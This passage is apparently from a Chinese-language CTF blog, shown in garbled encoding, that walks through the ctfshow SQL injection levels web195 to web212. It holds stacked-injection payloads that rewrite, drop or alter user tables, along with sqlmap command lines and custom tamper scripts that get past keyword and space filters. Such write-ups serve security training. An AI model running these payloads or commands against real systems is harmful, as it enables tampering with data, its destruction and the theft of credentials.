<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>è¿”å›é€»è¾‘</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;ç™»é™†æˆåŠŸ flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰ç¦ç”¨<code>;</code>ï¼Œå¯ä»¥è€ƒè™‘å †å æ³¨å…¥ï¼Œä½†æ˜¯ç”±äºå¾ˆå¤šæŸ¥è¯¢å­—ç¬¦è¢«<code>ban</code>äº†ï¼Œæ‰€ä»¥è€ƒè™‘ä¿®æ”¹è¡¨</p>
<p>ç¬¬ä¸€ç§æ–¹æ³•å¯ä»¥åªä¿®æ”¹å¯†ç ï¼Œç„¶åå¼±ç±»å‹åŒ¹é…ç”¨<code>0</code>ç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ä¿®æ”¹å¯†ç </span><br><span class="line">username=1;update(ctfshow_user)set`pass`=1;&amp;password=1</span><br><span class="line"># ç™»å½•</span><br><span class="line">username=0&amp;password=1</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç›´æ¥æŠŠç”¨æˆ·åä¹Ÿæ”¹äº†ï¼Œç„¶åç™»å½•ä¿®æ”¹åçš„ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;update(ctfshow_user)set`username`=1&amp;password=1</span><br><span class="line">username=1&amp;password=1</span><br></pre></td></tr></table></figure>

<h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>ç›´æ¥ä½¿ç”¨ä»¥å‰æ³„éœ²çš„å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=passwordAUTO</span><br></pre></td></tr></table></figure>

<p>ç„¶ååå°å…¶å®æ²¡æœ‰ç¦ç”¨<code>select</code>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨é”™è¯¯<code>username</code>ä½¿å¾—ç¬¬ä¸€ä¸ªæŸ¥è¯¢ä¸ºç©ºï¼Œç„¶åå †å ä¸€ä¸ªè¯­å¥ä½¿å…¶è¾“å‡ºä¸ºå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;select(2);&amp;password=2</span><br></pre></td></tr></table></figure>

<h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>å¯ä»¥ç›´æ¥ç”¨ä¸Šä¸€å…³æ–¹æ³•ï¼Œä¸è¿‡<code>select</code>çœŸçš„è¢«ç¦ç”¨äº†è¿™æ¬¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;show tables;&amp;password=ctfshow_user</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥æŠŠåŸæ¥è¡¨åˆ é™¤å»ºä¸ªæ–°è¡¨ï¼Œç„¶åæ·»åŠ è‡ªå®šä¹‰ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;drop table ctfshow_user;create table ctfshow_user(`username` varchar(100),`pass` varchar(100));insert ctfshow_user(`username`,`pass`) value(1,2)&amp;password=ctfshow_user</span><br><span class="line"></span><br><span class="line">username=1&amp;password=2</span><br></pre></td></tr></table></figure>

<h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>ä¸Šä¸€å…³æ–¹æ³•æ¥ç€ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;show tables;&amp;password=ctfshow_user</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥ç”¨å·²ç»æ³„éœ²çš„ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=passwordAUTO</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¦‚æœä¸çŸ¥é“å¯†ç ä½†å·²çŸ¥æœ‰ä¸€ä¸ªç”¨æˆ·æ˜¯<code>userAUTO</code>ä¹Ÿå¯ä»¥äº’æ¢è¡¨çš„ç”¨æˆ·åå’Œå¯†ç åˆ—</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0;alter table ctfshow_user change `username` `pass2` varchar(100);alter table ctfshow_user change `pass` `username` varchar(100);alter table ctfshow_user change `pass2` `pass` varchar(100);&amp;password=1</span><br><span class="line"></span><br><span class="line">username=0&amp;password=userAUTO</span><br></pre></td></tr></table></figure>

<h2 id="web199-200"><a href="#web199-200" class="headerlink" title="web199-200"></a>web199-200</h2><p>ä¸Šä¸€å…³æ–¹æ³•æ¥ç€ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1;show tables;&amp;password=ctfshow_user</span><br></pre></td></tr></table></figure>

<p>å·²ç»æ³„éœ²çš„ç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0&amp;password=passwordAUTO</span><br></pre></td></tr></table></figure>

<p>æ‹¬å·è¢«ç¦ç”¨äº†ï¼Œå¯ä»¥ä½¿ç”¨<code>text</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=0;alter table ctfshow_user change `username` `pass2` text;alter table ctfshow_user change `pass` `username` text;alter table ctfshow_user change `pass2` `pass` text;&amp;password=1</span><br><span class="line"></span><br><span class="line">username=0&amp;password=userAUTO</span><br></pre></td></tr></table></figure>

<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>è¦æ±‚ä¸­</p>
<blockquote>
<p>ä½¿ç”¨â€“user-agent æŒ‡å®šagent</p>
<p>ä½¿ç”¨â€“referer ç»•è¿‡refereræ£€æŸ¥</p>
</blockquote>
<p>æŒ‡å®š<code>ua</code>å’Œ<code>ref</code>å³å¯</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰¾åˆ°æ³¨å…¥ç‚¹</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show</span><br><span class="line"><span class="comment"># æŸ¥çœ‹æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--dbs</span></span><br><span class="line"><span class="comment"># æŸ¥çœ‹è¡¨ ctfshow_user</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span></span><br><span class="line"><span class="comment"># æŸ¥çœ‹åˆ— id pass username</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">--columns</span></span><br><span class="line"><span class="comment"># æŠŠpassç»™dumpä¸‹æ¥å³å¯æ‰¾åˆ°flag</span></span><br><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc8db124-5468-4443-9bc1-070ad3aaec8d.challenge.ctf.show/api/?id=1&amp;page=1&amp;limit=10&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">-C</span> pass <span class="literal">--dump</span></span><br></pre></td></tr></table></figure>

<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>æ”¹æˆ<code>POST</code>æ–¹å¼</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc958326-ca9d-4132-88e3-60b614b797f3.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">-C</span> pass <span class="literal">--dump</span> <span class="literal">--batch</span></span><br></pre></td></tr></table></figure>

<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>æ”¹æˆ<code>PUT</code>æ–¹æ³•å¹¶ä¸”è®°å¾—æ›´æ”¹<code>Content-Type</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://e33e4ae1-8bef-4b7d-b592-3db290684d23.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">-C</span> pass <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>æ·»åŠ <code>Cookie</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://27d5c675-f147-45cb-b57f-2388cc19da3d.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">-C</span> pass <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=e4n6k9ucq0aik0op9oc9ad1b3u;ctfshow=4410fbe56cd70245d52c57b405d569f2&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>é‰´æƒ</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://50c5fc83-2892-4382-ab5f-59a827c78045.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">-T</span> ctfshow_user <span class="literal">-C</span> pass <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=e4n6k9ucq0aik0op9oc9ad1b3u;ctfshow=4410fbe56cd70245d52c57b405d569f2&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://50c5fc83-2892-4382-ab5f-59a827c78045.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>åŠ ä¸ªå‰ç¼€åç¼€å°±è¡Œï¼Œè®°å¾—è¡¨ååˆ—åå˜äº†</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://e75a3848-836e-4ee1-a262-4573b3a8a34e.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=c9v7srpall5anm0iu80j0uh3vr;ctfshow=4410fbe56cd70245d52c57b405d569f2;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://e75a3848-836e-4ee1-a262-4573b3a8a34e.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨<code>sqlmap</code>è‡ªå¸¦çš„<code>tamper</code>å³å¯</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cc9fbf46-0256-48aa-8863-044662e4bac3.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=67bo7vdpo12g2ae9o48fh4sg8r;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://cc9fbf46-0256-48aa-8863-044662e4bac3.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=space2comment</span><br></pre></td></tr></table></figure>

<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><p>åªè¿‡æ»¤äº†å°å†™çš„<code>select</code>ï¼Œè€Œ<code>sqlmap</code>é»˜è®¤ç”¨çš„å¤§å†™ï¼Œæ•…å¯ä»¥ç›´æ¥ç”¨</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://87e67c0f-91ee-488a-a719-4359be5fd453.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--prefix</span>=<span class="string">&quot;&#x27;)&quot;</span> <span class="literal">--suffix</span>=<span class="string">&quot;#&quot;</span> <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=iu086rcmu6ov5b1931b7dnhsmo;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://87e67c0f-91ee-488a-a719-4359be5fd453.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=space2comment</span><br></pre></td></tr></table></figure>

<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><p>ç¦ç”¨äº†<code>ç©ºæ ¼</code>ï¼Œ<code>*</code>å’Œ<code>=</code>ï¼Œè‡ªå·±å†™ä¸ª<code>tamper</code>æŠŠç©ºæ ¼è½¬<code>%09</code>ï¼Œç„¶åç”¨è‡ªå¸¦çš„<code>equaltolike</code>æŠŠ<code>=</code>è½¬<code>LIKE</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces all occurrences of operator equal (&#x27; &#x27;) with &#x27;%09&#x27; counterpart</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls that</span></span><br><span class="line"><span class="string">          filter the equal character (&#x27;=&#x27;)</span></span><br><span class="line"><span class="string">        * The LIKE operator is SQL standard. Hence, this tamper script</span></span><br><span class="line"><span class="string">          should work against all (?) databases</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT * FROM users WHERE id=1&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT%09*%09FROM%09users%09WHERE%09id=1&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">9</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ³¨å…¥å³å¯</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://b444630b-fdaf-42b0-a937-6bedf23552c8.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=qhel3mleaja9g3me4qafpa41m7;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://b444630b-fdaf-42b0-a937-6bedf23552c8.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=spaceto09,equaltolike</span><br></pre></td></tr></table></figure>

<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><p>æœ‰ä¸ªè§£å¯†è¿‡ç¨‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>å†™ä¸ª<code>tamper</code>è¿›è¡ŒåŠ å¯†å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    To solve ctfshow web210</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;PU1WUk1WMFFVQlNha0JpUlM5VVRnVTNjbEozYw==&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload = <span class="built_in">bytes</span>(payload,encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    retVal = base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>])[::-<span class="number">1</span>])</span><br><span class="line">    retVal = retVal.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œæ³¨å…¥</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://9c8ba351-ef94-4fce-9ab9-d3830183aa80.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=u1sdsf6g3cro8q18mg305dok88;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://9c8ba351-ef94-4fce-9ab9-d3830183aa80.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=ctfshowweb210</span><br></pre></td></tr></table></figure>

<h2 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šè¿‡æ»¤äº†ç©ºæ ¼</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://9ba42ae2-b5b6-42fb-9a97-3fe76bfad647.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=r203hge81fkks8u8sj6pckeap6;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://9ba42ae2-b5b6-42fb-9a97-3fe76bfad647.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=space2comment,ctfshowweb210</span><br></pre></td></tr></table></figure>

<h2 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h2><p>åœ¨ä¸Šä¸€å…³åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>*</code></p>
